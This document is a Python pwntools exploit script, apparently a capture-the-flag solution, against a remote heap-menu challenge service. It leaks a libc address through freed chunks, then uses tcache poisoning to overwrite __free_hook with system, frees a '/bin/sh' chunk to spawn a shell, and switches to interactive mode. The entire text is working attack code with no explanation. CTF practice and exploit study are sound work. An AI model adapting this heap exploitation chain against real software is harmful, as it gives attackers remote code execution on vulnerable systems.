from pwn import *

context.log_level = "debug"

p = remote("chall.ehax.tech", 1925) # process("chall")
l = ELF("libc-2.31.so")

def mallocc(idx, size, payload=b""):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"> ", str(idx).encode())
	p.sendlineafter(b"> ",  str(size).encode())
	p.sendlineafter(b"> ", payload)

def freee(idx):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"> ", str(idx).encode())

def edit(idx, payload):
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b"> ", str(idx).encode())
	p.sendlineafter(b"> ", payload)

def view(idx):
	p.sendlineafter(b"> ", b"4")
	p.sendlineafter(b"> ", str(idx).encode())

	return p.recvline()[:-1]

def exit():
	p.sendlineafter(b"> ", b"5")

for idx in range(9):
	mallocc(idx, 0x90)


for idx in range(3, 9, 1):
	freee(idx)

freee(1)
freee(0)
freee(2)

# libc leak
libc_base = u64(view(0).ljust(8, b"\x00")) - 0x1ecbe0
system_address = libc_base + l.symbols["system"]
free_hook_address = libc_base + l.symbols["__free_hook"]

print("[+] libc address: %016x" % libc_base)
print("[+] system address: %016x" % system_address)
print("[+] free hook address: %016x" % free_hook_address)

mallocc(30, 0x90, b"/bin/sh\x00")

# tcache poisoning
mallocc(0, 0x90)
freee(0)
edit(0, b"a" * 0x16)
freee(0)
mallocc(10, 0x90, p64(free_hook_address))
mallocc(11, 0x90, b"/bin/sh\x00")
mallocc(12, 0x90, p64(system_address))

freee(11)

p.interactive()
